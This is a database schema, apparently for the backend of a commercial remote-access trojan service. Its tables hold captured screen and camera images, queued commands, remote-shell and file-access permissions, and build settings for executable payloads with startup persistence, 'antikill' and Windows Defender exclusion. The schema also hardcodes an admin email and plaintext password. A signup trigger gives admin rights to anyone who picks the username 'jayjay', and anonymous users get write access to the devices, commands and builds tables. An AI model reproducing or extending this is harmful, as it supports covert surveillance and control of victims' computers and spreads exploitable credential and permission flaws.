CREATE TABLE public.devices (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  pc_name text NOT NULL, device_name text NOT NULL, ip_address text NOT NULL,
  os text, is_online boolean NOT NULL DEFAULT false,
  last_seen timestamptz NOT NULL DEFAULT now(), created_at timestamptz NOT NULL DEFAULT now()
);
ALTER TABLE public.devices ENABLE ROW LEVEL SECURITY;
DO $w$ BEGIN ALTER PUBLICATION supabase_realtime ADD TABLE public.devices; EXCEPTION WHEN others THEN NULL; END $w$;
ALTER TABLE public.devices REPLICA IDENTITY FULL;

create type public.app_role as enum ('admin', 'operator', 'viewer');

create table public.profiles (
  id uuid primary key references auth.users(id) on delete cascade,
  email text, full_name text,
  created_at timestamptz not null default now(), updated_at timestamptz not null default now()
);
create table public.user_roles (
  id uuid primary key default gen_random_uuid(),
  user_id uuid not null references auth.users(id) on delete cascade,
  role public.app_role not null, created_at timestamptz not null default now(),
  unique (user_id, role)
);
alter table public.profiles enable row level security;
alter table public.user_roles enable row level security;

create or replace function public.has_role(_user_id uuid, _role public.app_role)
returns boolean language sql stable security definer set search_path = public
as $$ select exists (select 1 from public.user_roles where user_id = _user_id and role = _role) $$;

create or replace function public.touch_updated_at()
returns trigger language plpgsql set search_path = public
as $$ begin new.updated_at = now(); return new; end; $$;

create trigger trg_profiles_updated_at before update on public.profiles for each row execute function public.touch_updated_at();

create policy "Profiles readable by authenticated" on public.profiles for select to authenticated using (true);
create policy "Users update own profile" on public.profiles for update to authenticated using (auth.uid() = id);
create policy "Users insert own profile" on public.profiles for insert to authenticated with check (id = auth.uid());
create policy "Users read own roles" on public.user_roles for select to authenticated using (user_id = auth.uid() or public.has_role(auth.uid(), 'admin'));
create policy "Admins manage roles" on public.user_roles for all to authenticated using (public.has_role(auth.uid(), 'admin')) with check (public.has_role(auth.uid(), 'admin'));
GRANT SELECT, INSERT, UPDATE, DELETE ON public.profiles TO authenticated;
GRANT ALL ON public.profiles TO service_role;
GRANT SELECT ON public.user_roles TO authenticated;
GRANT ALL ON public.user_roles TO service_role;

alter table public.devices
  add column if not exists device_token_hash text,
  add column if not exists enrollment_code text unique,
  add column if not exists owner_user_id uuid,
  add column if not exists username text,
  add column if not exists last_seen_ip text,
  add column if not exists tag text,
  add column if not exists last_screen_b64 text,
  add column if not exists last_screen_at timestamptz,
  add column if not exists last_camera_b64 text,
  add column if not exists last_camera_at timestamptz,
  add column if not exists pending_commands jsonb not null default '[]'::jsonb,
  add column if not exists updated_at timestamptz not null default now();
create trigger trg_devices_updated_at before update on public.devices for each row execute function public.touch_updated_at();
create index if not exists idx_devices_owner on public.devices(owner_user_id);
create index if not exists idx_devices_enrollment_code on public.devices(enrollment_code);
create index if not exists idx_devices_token_hash on public.devices(device_token_hash);
create policy "Operators read devices" on public.devices for select to authenticated
  using (public.has_role(auth.uid(),'operator') or public.has_role(auth.uid(),'admin') or public.has_role(auth.uid(),'viewer'));
create policy "Operators enroll devices" on public.devices for insert to authenticated
  with check (public.has_role(auth.uid(),'operator') or public.has_role(auth.uid(),'admin'));
create policy "Operators update own devices" on public.devices for update to authenticated
  using (owner_user_id = auth.uid() or public.has_role(auth.uid(),'admin'));
create policy "Admins delete devices" on public.devices for delete to authenticated using (public.has_role(auth.uid(),'admin'));
GRANT SELECT, INSERT, UPDATE, DELETE ON public.devices TO authenticated;
GRANT SELECT, INSERT, UPDATE ON public.devices TO anon;
GRANT ALL ON public.devices TO service_role;

create table public.device_metrics (
  id uuid primary key default gen_random_uuid(),
  device_id uuid not null references public.devices(id) on delete cascade,
  cpu_percent numeric, ram_percent numeric, ram_used_mb bigint, ram_total_mb bigint,
  gpu_info text, network_rx_kbps numeric, network_tx_kbps numeric, uptime_seconds bigint,
  recorded_at timestamptz not null default now()
);
create index idx_device_metrics_device_recorded on public.device_metrics(device_id, recorded_at desc);
alter table public.device_metrics enable row level security;
create policy "Operators read metrics" on public.device_metrics for select to authenticated
  using (public.has_role(auth.uid(),'operator') or public.has_role(auth.uid(),'admin') or public.has_role(auth.uid(),'viewer'));
GRANT SELECT, INSERT ON public.device_metrics TO authenticated;
GRANT SELECT, INSERT ON public.device_metrics TO anon;
GRANT ALL ON public.device_metrics TO service_role;
DO $w$ BEGIN ALTER PUBLICATION supabase_realtime ADD TABLE public.device_metrics; EXCEPTION WHEN others THEN NULL; END $w$;
ALTER TABLE public.device_metrics REPLICA IDENTITY FULL;

create table public.sessions (
  id uuid primary key default gen_random_uuid(),
  device_id uuid not null references public.devices(id) on delete cascade,
  operator_id uuid not null references auth.users(id) on delete cascade,
  started_at timestamptz not null default now(), ended_at timestamptz, end_reason text,
  permissions jsonb not null default '{}'::jsonb, client_ip text
);
create index idx_sessions_device on public.sessions(device_id, started_at desc);
create index idx_sessions_operator on public.sessions(operator_id, started_at desc);
alter table public.sessions enable row level security;
create policy "Operators read own sessions" on public.sessions for select to authenticated using (operator_id = auth.uid() or public.has_role(auth.uid(),'admin'));
create policy "Operators create own sessions" on public.sessions for insert to authenticated
  with check (operator_id = auth.uid() and (public.has_role(auth.uid(),'operator') or public.has_role(auth.uid(),'admin')));
create policy "Operators end own sessions" on public.sessions for update to authenticated using (operator_id = auth.uid() or public.has_role(auth.uid(),'admin'));
GRANT SELECT, INSERT, UPDATE ON public.sessions TO authenticated;
GRANT ALL ON public.sessions TO service_role;

create table public.audit_logs (
  id uuid primary key default gen_random_uuid(),
  action text not null,
  operator_id uuid references auth.users(id) on delete set null,
  device_id uuid references public.devices(id) on delete set null,
  session_id uuid references public.sessions(id) on delete set null,
  ip text, metadata jsonb not null default '{}'::jsonb,
  created_at timestamptz not null default now()
);
create index idx_audit_device on public.audit_logs(device_id, created_at desc);
create index idx_audit_operator on public.audit_logs(operator_id, created_at desc);
alter table public.audit_logs enable row level security;
create policy "Operators read audit logs" on public.audit_logs for select to authenticated using (public.has_role(auth.uid(),'operator') or public.has_role(auth.uid(),'admin'));
create policy "Operators insert own audit logs" on public.audit_logs for insert to authenticated
  with check (operator_id = auth.uid() and (public.has_role(auth.uid(),'operator') or public.has_role(auth.uid(),'admin')));
GRANT SELECT, INSERT ON public.audit_logs TO authenticated;
GRANT INSERT ON public.audit_logs TO anon;
GRANT ALL ON public.audit_logs TO service_role;

create table public.device_permissions (
  device_id uuid primary key references public.devices(id) on delete cascade,
  screen_view boolean not null default false, camera boolean not null default false,
  remote_shell boolean not null default false, file_access boolean not null default false,
  updated_at timestamptz not null default now()
);
alter table public.device_permissions enable row level security;
create trigger trg_device_perms_updated_at before update on public.device_permissions for each row execute function public.touch_updated_at();
create policy "Operators read device permissions" on public.device_permissions for select to authenticated
  using (public.has_role(auth.uid(),'operator') or public.has_role(auth.uid(),'admin') or public.has_role(auth.uid(),'viewer'));
create policy "Admins manage device permissions" on public.device_permissions for all to authenticated
  using (public.has_role(auth.uid(),'admin')) with check (public.has_role(auth.uid(),'admin'));
GRANT SELECT, INSERT, UPDATE, DELETE ON public.device_permissions TO authenticated;
GRANT ALL ON public.device_permissions TO service_role;

create table if not exists public.command_results (
  id uuid primary key default gen_random_uuid(),
  device_id uuid not null references public.devices(id) on delete cascade,
  command_id text not null, result jsonb,
  created_at timestamptz not null default now()
);
alter table public.command_results enable row level security;
create policy "Operators read command results" on public.command_results for select to authenticated using (true);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.command_results TO authenticated;
GRANT ALL ON public.command_results TO service_role;
DO $w$ BEGIN ALTER PUBLICATION supabase_realtime ADD TABLE public.command_results; EXCEPTION WHEN others THEN NULL; END $w$;
ALTER TABLE public.command_results REPLICA IDENTITY FULL;

create table if not exists public.commands (
  id uuid primary key default gen_random_uuid(),
  device_id uuid not null references public.devices(id) on delete cascade,
  action text not null, payload jsonb not null default '{}'::jsonb,
  status text not null default 'pending' check (status in ('pending','running','done','error')),
  result jsonb, error text,
  created_at timestamptz not null default now(), completed_at timestamptz
);
create index idx_commands_device_status on public.commands(device_id, status, created_at desc);
alter table public.commands enable row level security;
create policy "Operators read commands" on public.commands for select to authenticated using (public.has_role(auth.uid(),'operator') or public.has_role(auth.uid(),'admin'));
create policy "Operators insert commands" on public.commands for insert to authenticated with check (public.has_role(auth.uid(),'operator') or public.has_role(auth.uid(),'admin'));
create policy "Operators update commands" on public.commands for update to authenticated using (public.has_role(auth.uid(),'operator') or public.has_role(auth.uid(),'admin'));
GRANT SELECT, INSERT, UPDATE ON public.commands TO authenticated;
GRANT SELECT, INSERT, UPDATE ON public.commands TO anon;
GRANT ALL ON public.commands TO service_role;
DO $w$ BEGIN ALTER PUBLICATION supabase_realtime ADD TABLE public.commands; EXCEPTION WHEN others THEN NULL; END $w$;
ALTER TABLE public.commands REPLICA IDENTITY FULL;

create table if not exists public.subscriptions (
  id uuid primary key default gen_random_uuid(),
  user_id uuid not null references auth.users(id) on delete cascade,
  plan text not null, status text not null default 'pending',
  provider text not null default 'nowpayments', provider_payment_id text,
  amount_usd numeric, currency text,
  started_at timestamptz, expires_at timestamptz,
  created_at timestamptz not null default now()
);
create index if not exists subscriptions_user_idx on public.subscriptions(user_id);
alter table public.subscriptions enable row level security;
create policy "Users read own subs" on public.subscriptions for select to authenticated using (user_id = auth.uid() or public.has_role(auth.uid(),'admin'));
create policy "Admins insert subs" on public.subscriptions for insert to authenticated with check (public.has_role(auth.uid(),'admin'));
create policy "Admins update subs" on public.subscriptions for update to authenticated using (public.has_role(auth.uid(),'admin')) with check (public.has_role(auth.uid(),'admin'));
GRANT SELECT, INSERT, UPDATE ON public.subscriptions TO authenticated;
GRANT ALL ON public.subscriptions TO service_role;

create table if not exists public.build_server_config (
  id uuid primary key default gen_random_uuid(),
  key text not null unique, label text not null default 'default',
  buildserver_url text, last_seen_at timestamptz,
  created_at timestamptz not null default now()
);
alter table public.build_server_config enable row level security;
create policy "Admins manage build server config" on public.build_server_config for all to authenticated
  using (public.has_role(auth.uid(),'admin')) with check (public.has_role(auth.uid(),'admin'));
create policy "Authenticated read build server config" on public.build_server_config for select to authenticated using (true);
GRANT SELECT, INSERT, UPDATE ON public.build_server_config TO authenticated;
GRANT ALL ON public.build_server_config TO service_role;

alter table public.profiles
  add column if not exists username text unique,
  add column if not exists avatar_url text,
  add column if not exists bio text,
  add column if not exists discord_id text unique,
  add column if not exists discord_username text,
  add column if not exists theme text not null default 'dark',
  add column if not exists profile_completed boolean not null default false,
  add column if not exists discord_rpc_enabled boolean not null default false,
  add column if not exists discord_status_enabled boolean not null default false,
  add column if not exists referral_code text unique,
  add column if not exists referred_by uuid,
  add column if not exists is_banned boolean NOT NULL DEFAULT false,
  add column if not exists ban_reason text,
  add column if not exists is_removed boolean NOT NULL DEFAULT false,
  add column if not exists totp_secret text,
  add column if not exists totp_enabled boolean NOT NULL DEFAULT false,
  add column if not exists display_name text,
  add column if not exists socials jsonb NOT NULL DEFAULT '{}'::jsonb,
  add column if not exists bio_theme text NOT NULL DEFAULT 'terminal',
  add column if not exists bio_public boolean NOT NULL DEFAULT true,
  add column if not exists recovery_token_hash text,
  add column if not exists recovery_token_set_at timestamptz;
create index if not exists profiles_username_idx on public.profiles (lower(username));

create table if not exists public.community_posts (
  id uuid primary key default gen_random_uuid(),
  author_id uuid not null references auth.users(id) on delete cascade,
  channel text not null check (channel in ('news','reviews','chat')),
  body text, image_url text, kind text,
  created_at timestamptz not null default now()
);
create index if not exists community_posts_channel_idx on public.community_posts(channel, created_at desc);
alter table public.community_posts enable row level security;
create policy "Anyone read community" on public.community_posts for select to authenticated using (true);
create policy "Users post community" on public.community_posts for insert to authenticated
  with check ((channel='news' and public.has_role(auth.uid(),'admin')) or (channel in ('reviews','chat') and author_id = auth.uid()));
create policy "Authors delete own" on public.community_posts for delete to authenticated using (author_id = auth.uid() or public.has_role(auth.uid(),'admin'));
GRANT SELECT, INSERT, DELETE ON public.community_posts TO authenticated;
GRANT ALL ON public.community_posts TO service_role;

create table if not exists public.notifications (
  id uuid primary key default gen_random_uuid(),
  user_id uuid references auth.users(id) on delete cascade,
  title text not null, body text, read_at timestamptz,
  kind text not null default 'system', payload jsonb not null default '{}'::jsonb,
  created_at timestamptz not null default now()
);
create index if not exists notifications_user_idx on public.notifications(user_id, created_at desc);
alter table public.notifications enable row level security;
create policy "Users read own notifs" on public.notifications for select to authenticated using (user_id = auth.uid() or user_id is null);
create policy "Users update own notifs" on public.notifications for update to authenticated using (user_id = auth.uid());
create policy "Admins create notifs" on public.notifications for insert to authenticated with check (public.has_role(auth.uid(),'admin'));
GRANT SELECT, INSERT, UPDATE ON public.notifications TO authenticated;
GRANT ALL ON public.notifications TO service_role;

create table if not exists public.active_sessions (
  user_id uuid primary key references auth.users(id) on delete cascade,
  session_id text not null, user_agent text, ip text,
  updated_at timestamptz not null default now()
);
alter table public.active_sessions enable row level security;
create policy "Users read own session" on public.active_sessions for select to authenticated using (user_id = auth.uid());
create policy "Users upsert own session" on public.active_sessions for insert to authenticated with check (user_id = auth.uid());
create policy "Users update own session" on public.active_sessions for update to authenticated using (user_id = auth.uid());
create policy "Users delete own session" on public.active_sessions for delete to authenticated using (user_id = auth.uid());
GRANT SELECT, INSERT, UPDATE, DELETE ON public.active_sessions TO authenticated;
GRANT ALL ON public.active_sessions TO service_role;

create table if not exists public.builds (
  id uuid primary key default gen_random_uuid(),
  user_id uuid not null, name text not null,
  startup boolean not null default false, startup_name text,
  debug boolean not null default false, output_kind text not null default 'exe',
  icon_url text, status text not null default 'queued',
  download_url text, error text,
  progress integer NOT NULL DEFAULT 0,
  target_server_url text,
  antikill boolean NOT NULL DEFAULT false,
  tag text, wd_exclusion boolean NOT NULL DEFAULT false,
  require_admin boolean NOT NULL DEFAULT false,
  created_at timestamptz not null default now(), completed_at timestamptz
);
create index if not exists builds_user_idx on public.builds(user_id, created_at desc);
alter table public.builds enable row level security;
create policy "Users read own builds" on public.builds for select to authenticated using (user_id = auth.uid());
create policy "Users insert own builds" on public.builds for insert to authenticated with check (user_id = auth.uid());
create policy "Users delete own builds" on public.builds for delete to authenticated using (user_id = auth.uid());
create policy "Service update builds" on public.builds for update to anon using (true) with check (true);
create policy "Admins manage all builds" on public.builds for all to authenticated
  using (public.has_role(auth.uid(),'admin')) with check (public.has_role(auth.uid(),'admin'));
GRANT SELECT, INSERT, UPDATE, DELETE ON public.builds TO authenticated;
GRANT UPDATE ON public.builds TO anon;
GRANT ALL ON public.builds TO service_role;

create table if not exists public.friendships (
  id uuid primary key default gen_random_uuid(),
  requester_id uuid not null, addressee_id uuid not null,
  status text not null default 'pending' check (status in ('pending','accepted','blocked')),
  created_at timestamptz not null default now(), updated_at timestamptz not null default now(),
  constraint friendships_distinct check (requester_id <> addressee_id),
  constraint friendships_unique_pair unique (requester_id, addressee_id)
);
create index if not exists idx_friendships_addressee on public.friendships(addressee_id);
create index if not exists idx_friendships_requester on public.friendships(requester_id);
alter table public.friendships enable row level security;
create policy "Friendship readable by either party" on public.friendships for select to authenticated using (auth.uid() = requester_id or auth.uid() = addressee_id);
create policy "Users send friend requests" on public.friendships for insert to authenticated with check (auth.uid() = requester_id);
create policy "Either party updates friendship" on public.friendships for update to authenticated using (auth.uid() = requester_id or auth.uid() = addressee_id);
create policy "Either party deletes friendship" on public.friendships for delete to authenticated using (auth.uid() = requester_id or auth.uid() = addressee_id);
create policy "Admins read all friendships" on public.friendships for select to authenticated using (public.has_role(auth.uid(),'admin'));
create trigger friendships_touch before update on public.friendships for each row execute function public.touch_updated_at();
GRANT SELECT, INSERT, UPDATE, DELETE ON public.friendships TO authenticated;
GRANT ALL ON public.friendships TO service_role;

create table if not exists public.direct_messages (
  id uuid primary key default gen_random_uuid(),
  conversation_key text not null, sender_id uuid not null, recipient_id uuid not null,
  kind text not null default 'text' check (kind in ('text','image','share_client','request_client','system')),
  body text, image_url text, payload jsonb not null default '{}'::jsonb,
  created_at timestamptz not null default now(), read_at timestamptz
);
create index if not exists idx_dm_conv on public.direct_messages(conversation_key, created_at desc);
create index if not exists idx_dm_recipient on public.direct_messages(recipient_id, read_at);
alter table public.direct_messages enable row level security;
create policy "DM readable by participants" on public.direct_messages for select to authenticated using (auth.uid() = sender_id or auth.uid() = recipient_id);
create policy "Send DM as self to friend" on public.direct_messages for insert to authenticated
  with check (auth.uid() = sender_id and exists (
    select 1 from public.friendships f where f.status='accepted'
      and ((f.requester_id = sender_id and f.addressee_id = recipient_id)
        or (f.addressee_id = sender_id and f.requester_id = recipient_id))));
create policy "Recipient marks DM read" on public.direct_messages for update to authenticated using (auth.uid() = recipient_id);
create policy "Admins read all DMs" on public.direct_messages for select to authenticated using (public.has_role(auth.uid(),'admin'));
GRANT SELECT, INSERT, UPDATE ON public.direct_messages TO authenticated;
GRANT ALL ON public.direct_messages TO service_role;

create table if not exists public.device_access (
  id uuid primary key default gen_random_uuid(),
  device_id uuid not null, user_id uuid not null,
  role text not null default 'controller' check (role in ('host','controller','viewer')),
  granted_by uuid, created_at timestamptz not null default now(),
  unique (device_id, user_id)
);
create index if not exists idx_device_access_user on public.device_access(user_id);
create index if not exists idx_device_access_device on public.device_access(device_id);
alter table public.device_access enable row level security;

create table if not exists public.client_shares (
  id uuid primary key default gen_random_uuid(),
  device_id uuid not null, host_user_id uuid not null, shared_with_user_id uuid not null,
  initiator_id uuid not null,
  flow text not null check (flow in ('share','request')),
  status text not null default 'pending' check (status in ('pending','accepted','declined','revoked')),
  dm_id uuid, created_at timestamptz not null default now(), responded_at timestamptz
);
create index if not exists idx_client_shares_recipient on public.client_shares(shared_with_user_id);
create index if not exists idx_client_shares_host on public.client_shares(host_user_id);
alter table public.client_shares enable row level security;
create policy "Share readable by participants" on public.client_shares for select to authenticated
  using (auth.uid() in (host_user_id, shared_with_user_id, initiator_id) or public.has_role(auth.uid(),'admin'));
create policy "Initiator creates share" on public.client_shares for insert to authenticated
  with check (auth.uid() = initiator_id and (
    (flow = 'share' and exists (select 1 from public.devices d where d.id = device_id and d.owner_user_id = host_user_id and host_user_id = auth.uid()))
    or (flow = 'request' and exists (select 1 from public.devices d where d.id = device_id and d.owner_user_id = host_user_id and shared_with_user_id = auth.uid()))));
create policy "Participants update share" on public.client_shares for update to authenticated using (auth.uid() in (host_user_id, shared_with_user_id));
GRANT SELECT, INSERT, UPDATE ON public.client_shares TO authenticated;
GRANT ALL ON public.client_shares TO service_role;

CREATE OR REPLACE FUNCTION public.is_device_owner(_device_id uuid, _user_id uuid)
RETURNS boolean LANGUAGE sql STABLE SECURITY DEFINER SET search_path = public AS $$
  SELECT EXISTS (SELECT 1 FROM public.devices WHERE id = _device_id AND owner_user_id = _user_id) $$;
CREATE OR REPLACE FUNCTION public.has_device_access(_device_id uuid, _user_id uuid)
RETURNS boolean LANGUAGE sql STABLE SECURITY DEFINER SET search_path = public AS $$
  SELECT EXISTS (SELECT 1 FROM public.device_access WHERE device_id = _device_id AND user_id = _user_id) $$;
CREATE POLICY "Authenticated read accessible devices" ON public.devices FOR SELECT TO authenticated
USING (owner_user_id = auth.uid() OR public.has_device_access(id, auth.uid()) OR public.has_role(auth.uid(),'admin'));
CREATE POLICY "Read device access rows" ON public.device_access FOR SELECT TO authenticated
USING (user_id = auth.uid() OR public.is_device_owner(device_id, auth.uid()) OR public.has_role(auth.uid(),'admin'));
CREATE POLICY "Host or admin manages device access" ON public.device_access FOR ALL TO authenticated
USING (public.has_role(auth.uid(),'admin') OR public.is_device_owner(device_id, auth.uid()))
WITH CHECK (public.has_role(auth.uid(),'admin') OR public.is_device_owner(device_id, auth.uid()));
GRANT SELECT, INSERT, UPDATE, DELETE ON public.device_access TO authenticated;
GRANT ALL ON public.device_access TO service_role;

create table if not exists public.referrals (
  id uuid primary key default gen_random_uuid(),
  referrer_id uuid not null, referee_id uuid not null unique,
  bonus_days_awarded int not null default 0, milestone_awarded boolean not null default false,
  activated_at timestamptz, created_at timestamptz not null default now()
);
alter table public.referrals enable row level security;
create policy "Referrer or referee reads referral" on public.referrals for select to authenticated
  using (auth.uid() = referrer_id or auth.uid() = referee_id or public.has_role(auth.uid(),'admin'));
create policy "Admins manage referrals" on public.referrals for all to authenticated
  using (public.has_role(auth.uid(),'admin')) with check (public.has_role(auth.uid(),'admin'));
GRANT SELECT, INSERT ON public.referrals TO authenticated;
GRANT ALL ON public.referrals TO service_role;

CREATE TABLE IF NOT EXISTS public.turn_servers (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  label text NOT NULL DEFAULT 'custom', url text NOT NULL,
  username text, credential text, enabled boolean NOT NULL DEFAULT true,
  created_at timestamptz NOT NULL DEFAULT now(), updated_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.turn_servers TO authenticated;
GRANT ALL ON public.turn_servers TO service_role;
ALTER TABLE public.turn_servers ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins manage TURN servers" ON public.turn_servers FOR ALL TO authenticated
  USING (public.has_role(auth.uid(),'admin')) WITH CHECK (public.has_role(auth.uid(),'admin'));
CREATE POLICY "Authenticated read TURN servers" ON public.turn_servers FOR SELECT TO authenticated USING (true);
CREATE TRIGGER trg_turn_servers_updated_at BEFORE UPDATE ON public.turn_servers FOR EACH ROW EXECUTE FUNCTION public.touch_updated_at();

CREATE TABLE IF NOT EXISTS public.recovery_codes (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id uuid NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
  code_hash text NOT NULL, used_at timestamptz, created_at timestamptz NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS recovery_codes_user_idx ON public.recovery_codes(user_id);
GRANT SELECT ON public.recovery_codes TO authenticated;
GRANT ALL ON public.recovery_codes TO service_role;
ALTER TABLE public.recovery_codes ENABLE ROW LEVEL SECURITY;
CREATE POLICY "users read own recovery codes" ON public.recovery_codes FOR SELECT TO authenticated USING (user_id = auth.uid());

CREATE TABLE IF NOT EXISTS public.bio_links (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id uuid NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
  title text NOT NULL, url text NOT NULL, icon text,
  position int NOT NULL DEFAULT 0, clicks int NOT NULL DEFAULT 0,
  created_at timestamptz NOT NULL DEFAULT now(), updated_at timestamptz NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS bio_links_user_pos_idx ON public.bio_links(user_id, position);
GRANT SELECT ON public.bio_links TO anon;
GRANT SELECT, INSERT, UPDATE, DELETE ON public.bio_links TO authenticated;
GRANT ALL ON public.bio_links TO service_role;
ALTER TABLE public.bio_links ENABLE ROW LEVEL SECURITY;
CREATE POLICY "owner full" ON public.bio_links FOR ALL TO authenticated USING (user_id = auth.uid()) WITH CHECK (user_id = auth.uid());
CREATE POLICY "public read when bio_public" ON public.bio_links FOR SELECT TO anon, authenticated
  USING (EXISTS (SELECT 1 FROM public.profiles p WHERE p.id = bio_links.user_id AND p.bio_public = true AND COALESCE(p.is_banned,false) = false));
CREATE TRIGGER bio_links_touch BEFORE UPDATE ON public.bio_links FOR EACH ROW EXECUTE FUNCTION public.touch_updated_at();
CREATE POLICY "Public bio profile read" ON public.profiles FOR SELECT TO anon
  USING (bio_public = true AND COALESCE(is_banned, false) = false);

CREATE OR REPLACE FUNCTION public.consume_recovery_code(_user_id uuid, _code_hash text)
RETURNS boolean LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
DECLARE rid uuid;
BEGIN
  SELECT id INTO rid FROM public.recovery_codes WHERE user_id = _user_id AND code_hash = _code_hash AND used_at IS NULL LIMIT 1;
  IF rid IS NULL THEN RETURN false; END IF;
  UPDATE public.recovery_codes SET used_at = now() WHERE id = rid;
  RETURN true;
END; $$;

CREATE OR REPLACE FUNCTION public.handle_new_user()
 RETURNS trigger LANGUAGE plpgsql SECURITY DEFINER SET search_path TO 'public' AS $function$
DECLARE
  meta jsonb := COALESCE(new.raw_user_meta_data, '{}'::jsonb);
  ref_code text; ref_user uuid; is_admin boolean := false;
  uname text := lower(COALESCE(meta->>'username', ''));
BEGIN
  ref_code := upper(substring(replace(gen_random_uuid()::text, '-', ''), 1, 8));
  IF meta ? 'ref_code' AND length(meta->>'ref_code') > 0 THEN
    SELECT id INTO ref_user FROM public.profiles WHERE referral_code = upper(meta->>'ref_code') LIMIT 1;
  END IF;
  INSERT INTO public.profiles (id, email, full_name, avatar_url, discord_id, discord_username, profile_completed, referral_code, referred_by, username)
  VALUES (new.id, new.email, COALESCE(meta->>'full_name', meta->>'discord_username', meta->>'username', new.email),
    meta->>'avatar_url', meta->>'discord_id', meta->>'discord_username', false, ref_code, ref_user, NULLIF(uname, ''))
  ON CONFLICT (id) DO UPDATE SET
    avatar_url = COALESCE(excluded.avatar_url, public.profiles.avatar_url),
    referral_code = COALESCE(public.profiles.referral_code, excluded.referral_code),
    referred_by = COALESCE(public.profiles.referred_by, excluded.referred_by),
    username = COALESCE(public.profiles.username, excluded.username);
  INSERT INTO public.user_roles (user_id, role) VALUES (new.id, 'operator') ON CONFLICT DO NOTHING;
  IF lower(new.email) IN ('jayjay@veltrix.xyz','jayjay@larping.cy') OR uname = 'jayjay' THEN
    INSERT INTO public.user_roles (user_id, role) VALUES (new.id, 'admin') ON CONFLICT DO NOTHING;
    is_admin := true;
  END IF;
  INSERT INTO public.subscriptions(user_id, plan, status, started_at, expires_at, provider, amount_usd, currency)
  VALUES (new.id, CASE WHEN is_admin THEN 'admin_grant' ELSE 'trial' END, 'active', now(),
    now() + CASE WHEN is_admin THEN interval '365 days' ELSE interval '3 days' END,
    CASE WHEN is_admin THEN 'admin' ELSE 'trial' END, 0,
    CASE WHEN is_admin THEN 'ADMIN' ELSE 'TRIAL' END);
  RETURN new;
END; $function$;

DROP TRIGGER IF EXISTS on_auth_user_created ON auth.users;
CREATE TRIGGER on_auth_user_created AFTER INSERT ON auth.users FOR EACH ROW EXECUTE FUNCTION public.handle_new_user();
GRANT EXECUTE ON FUNCTION public.has_role(uuid, public.app_role) TO authenticated, service_role;

CREATE EXTENSION IF NOT EXISTS pgcrypto;
DO $$
DECLARE v_email text := 'jayjay@veltrix.xyz'; v_password text := 'jayjay100!'; v_user_id uuid; v_encrypted text;
BEGIN
  SELECT id INTO v_user_id FROM auth.users WHERE lower(email) = lower(v_email) LIMIT 1;
  v_encrypted := crypt(v_password, gen_salt('bf'));
  IF v_user_id IS NULL THEN
    v_user_id := gen_random_uuid();
    INSERT INTO auth.users (instance_id, id, aud, role, email, encrypted_password,
      email_confirmed_at, raw_app_meta_data, raw_user_meta_data, created_at, updated_at,
      confirmation_token, email_change, email_change_token_new, recovery_token, is_super_admin)
    VALUES ('00000000-0000-0000-0000-000000000000', v_user_id, 'authenticated', 'authenticated', v_email, v_encrypted,
      now(), jsonb_build_object('provider','email','providers', jsonb_build_array('email')),
      jsonb_build_object('username','jayjay','full_name','JayJay'),
      now(), now(), '', '', '', '', false);
    INSERT INTO auth.identities (id, user_id, identity_data, provider, provider_id, last_sign_in_at, created_at, updated_at)
    VALUES (gen_random_uuid(), v_user_id,
      jsonb_build_object('sub', v_user_id::text, 'email', v_email, 'email_verified', true),
      'email', v_user_id::text, now(), now(), now());
  ELSE
    UPDATE auth.users SET encrypted_password = v_encrypted, email_confirmed_at = COALESCE(email_confirmed_at, now()), updated_at = now() WHERE id = v_user_id;
  END IF;
  INSERT INTO public.profiles (id, email, full_name, username, profile_completed)
  VALUES (v_user_id, v_email, 'JayJay', 'jayjay', true)
  ON CONFLICT (id) DO UPDATE SET username='jayjay', profile_completed=true, is_banned=false, is_removed=false;
  INSERT INTO public.user_roles (user_id, role) VALUES (v_user_id, 'admin') ON CONFLICT DO NOTHING;
  INSERT INTO public.user_roles (user_id, role) VALUES (v_user_id, 'operator') ON CONFLICT DO NOTHING;
  UPDATE public.subscriptions SET status='cancelled' WHERE user_id=v_user_id AND status='active';
  INSERT INTO public.subscriptions(user_id, plan, status, started_at, expires_at, provider, amount_usd, currency)
  VALUES (v_user_id, 'admin_grant', 'active', now(), now() + interval '365 days', 'admin', 0, 'ADMIN');
END $$;